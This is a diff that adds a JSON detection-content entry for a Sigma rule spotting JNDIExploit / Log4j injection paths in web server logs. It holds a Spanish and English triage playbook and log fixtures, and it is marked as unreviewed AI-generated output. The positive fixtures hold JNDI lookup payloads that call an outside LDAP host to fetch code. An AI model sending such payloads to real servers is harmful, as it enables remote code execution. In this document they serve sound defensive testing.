@@ -1,0 +1,121 @@
+{
+  "rule": {
+    "id": "412d55bc-7737-4d25-9542-5b396867ce55",
+    "title": "JNDIExploit Pattern",
+    "level": "high",
+    "status": "test",
+    "author": "Florian Roth (Nextron Systems)",
+    "path": "web/webserver_generic/web_jndi_exploit.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/web/webserver_generic/web_jndi_exploit.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1190"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Una línea de log del servidor web contiene una ruta de payload de JNDI-Exploit-Kit / JNDIExploit, como /Basic/Command/Base64/ o /TomcatBypass/ReverseShell/. Por lo general, esto significa que alguien intenta una inyección JNDI (por ejemplo, un lookup de Log4j) contra la aplicación.",
+      "what_it_detects": "Coincidencias por palabra clave en logs de servidor web (línea de petición, query o encabezados registrados como User-Agent) con las rutas LDAP/RMI de JNDI-Exploit-Kit: ejecución de comandos, reverse shells, memshells en memoria (Tomcat, Spring, Jetty, WebLogic, JBoss, WebSphere), gadgets de deserialización y callbacks DNS.",
+      "why_it_matters": "Se trata de explotación de una aplicación expuesta a Internet (T1190). Si el lookup se resuelve, el servidor descarga código Java controlado por el atacante. Eso puede derivar en ejecución remota de comandos, una reverse shell o un memshell sin archivos que persiste hasta que se reinicie el servicio.",
+      "triage_steps": [
+        "Ubique dónde aparece el patrón en la línea de log (URI, query string, User-Agent u otro encabezado). Registre la IP de origen, la hora, el virtual host y el código HTTP.",
+        "Extraiga el host y el puerto de callback de la cadena jndi:ldap:// o rmi://. Decodifique el segmento Base64 posterior a /Command/Base64/ para conocer el comando previsto.",
+        "Revise los logs de firewall, proxy y NetFlow en busca de conexiones salientes del servidor web hacia ese host en +/- 15 minutos. Cualquier conexión indica que el lookup probablemente se resolvió.",
+        "En el host, revise los procesos hijos del proceso Java o del servidor de aplicaciones (sh, bash, cmd, powershell, curl, wget) y los archivos nuevos en directorios temporales o en el webroot.",
+        "Si el payload es de tipo Memshell, busque filtros, servlets o listeners registrados en tiempo de ejecución y peticiones posteriores a rutas inusuales que respondan 200.",
+        "Pivotee por la IP de origen en todos los servidores web y en alertas previas. Verifique si la aplicación usa un componente de logging Java o JNDI vulnerable."
+      ],
+      "false_positives": [
+        "Aplicaciones o documentación legítimas cuyas URL contienen estas rutas por coincidencia (por ejemplo, un laboratorio de capacitación con /Basic/ReverseShell/).",
+        "Escaneos de vulnerabilidades o pruebas de penetración autorizadas que usan payloads de JNDI-Exploit-Kit.",
+        "Honeypots de investigación que registran payloads de ataque de forma intencional."
+      ],
+      "response_steps": [
+        "Compare la IP de origen con las listas de escáneres o pentests aprobados. Si no figura en ellas, trate la alerta como un intento de explotación.",
+        "Bloquee la IP de origen y el host de callback en el perímetro. Bloquee el tráfico LDAP/RMI saliente desde los servidores web.",
+        "Si se confirma tráfico de callback o procesos hijos sospechosos, aísle el servidor, recolecte memoria y logs y luego reinicie el servicio para eliminar memshells.",
+        "Parchee o mitigue el componente vulnerable, rote las credenciales accesibles desde el servidor y mantenga el monitoreo de actividad posterior."
+      ],
+      "severity_rationale": "El nivel alto corresponde porque estas rutas son propias de un kit de explotación y un éxito otorga ejecución remota de código en un servidor expuesto a Internet, aunque el intento por sí solo no prueba un compromiso."
+    },
+    "en": {
+      "summary": "A web server log line contains a URL path used by JNDI-Exploit-Kit / JNDIExploit, such as /Basic/Command/Base64/ or /TomcatBypass/ReverseShell/. This usually means someone is trying JNDI injection (for example a Log4j lookup) against the application.",
+      "what_it_detects": "Keyword matches in webserver logs (request line, query or logged headers such as User-Agent) for the LDAP/RMI payload paths of JNDI-Exploit-Kit: command execution, reverse shells, in-memory webshells (Tomcat, Spring, Jetty, WebLogic, JBoss, WebSphere), deserialization gadgets and DNS callbacks.",
+      "why_it_matters": "This is exploitation of a public-facing application (T1190). If the lookup is resolved, the server fetches attacker-controlled Java code. That can mean remote command execution, a reverse shell or a fileless memshell that persists until the service restarts.",
+      "triage_steps": [
+        "Find where the pattern appears in the log line (URI, query string, User-Agent, other logged header) and record the source IP, timestamp, virtual host and HTTP status.",
+        "Extract the callback host and port from the jndi:ldap:// or rmi:// string. Decode any Base64 segment after /Command/Base64/ to see the intended command.",
+        "Check firewall, proxy and NetFlow logs for outbound connections from the web server to that callback host within +/- 15 minutes. Any connection means the lookup was likely resolved.",
+        "On the host, look at child processes of the Java or app-server process (sh, bash, cmd, powershell, curl, wget) and for new files in temp or webroot directories.",
+        "For Memshell payloads, look for new filters, servlets or listeners registered at runtime, and for later requests to unusual paths that return 200.",
+        "Pivot on the source IP across all web servers and earlier alerts. Check whether the application uses a vulnerable Java logging or JNDI component."
+      ],
+      "false_positives": [
+        "Legitimate applications or documentation whose URLs happen to contain these paths (for example a /Basic/ReverseShell/ training lab).",
+        "Authorized vulnerability scans or penetration tests that use JNDI-Exploit-Kit payloads.",
+        "Security research honeypots that log attack payloads on purpose."
+      ],
+      "response_steps": [
+        "Check the source IP against approved scanner or pentest lists. If it is not on them, treat the alert as an exploitation attempt.",
+        "Block the source IP and the callback host at the perimeter. Block outbound LDAP/RMI traffic from web servers.",
+        "If callback traffic or suspicious child processes are confirmed, isolate the server, collect memory and logs, then restart the service to remove memshells.",
+        "Patch or mitigate the vulnerable component, rotate credentials reachable from the server, and keep monitoring for follow-up activity."
+      ],
+      "severity_rationale": "High fits because these paths are specific to an exploitation toolkit and success gives remote code execution on an internet-facing server, but an attempt alone does not prove compromise."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Apache combined log with a JNDI lookup in the User-Agent that points to the JNDIExploit /Basic/Command/Base64/ payload path",
+        "event": {
+          "message": "203.0.113.45 - - [12/Dec/2021:03:14:07 +0000] \"GET / HTTP/1.1\" 200 4512 \"-\" \"${jndi:ldap://203.0.113.10:1389/Basic/Command/Base64/aWQ=}\"",
+          "c-ip": "203.0.113.45",
+          "cs-method": "GET",
+          "cs-uri-stem": "/",
+          "sc-status": 200,
+          "cs-user-agent": "${jndi:ldap://203.0.113.10:1389/Basic/Command/Base64/aWQ=}"
+        }
+      },
+      {
+        "description": "Nginx access log with an unencoded JNDI lookup in the query string that uses the TomcatBypass DNS callback path",
+        "event": {
+          "message": "198.51.100.23 - - [13/Dec/2021:11:42:55 +0000] \"GET /search?q=${jndi:ldap://198.51.100.77:1389/TomcatBypass/Dnslog/probe.example.com} HTTP/1.1\" 400 157 \"-\" \"Mozilla/5.0\"",
+          "c-ip": "198.51.100.23",
+          "cs-method": "GET",
+          "cs-uri-stem": "/search",
+          "sc-status": 400
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate help page whose path contains /Basic/Commands/ but not the full /Basic/Command/Base64/ keyword",
+        "event": {
+          "message": "192.0.2.15 - - [14/Dec/2021:09:05:31 +0000] \"GET /help/Basic/Commands/list.html HTTP/1.1\" 200 8231 \"https://www.example.com/help/\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+          "c-ip": "192.0.2.15",
+          "cs-method": "GET",
+          "cs-uri-stem": "/help/Basic/Commands/list.html",
+          "sc-status": 200
+        }
+      },
+      {
+        "description": "Download of a documentation file named TomcatBypass-guide.pdf, which does not contain any full keyword such as /TomcatBypass/Command/",
+        "event": {
+          "message": "192.0.2.88 - - [14/Dec/2021:10:22:10 +0000] \"GET /static/docs/TomcatBypass-guide.pdf HTTP/1.1\" 200 120344 \"-\" \"Mozilla/5.0 (X11; Linux x86_64)\"",
+          "c-ip": "192.0.2.88",
+          "cs-method": "GET",
+          "cs-uri-stem": "/static/docs/TomcatBypass-guide.pdf",
+          "sc-status": 200
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
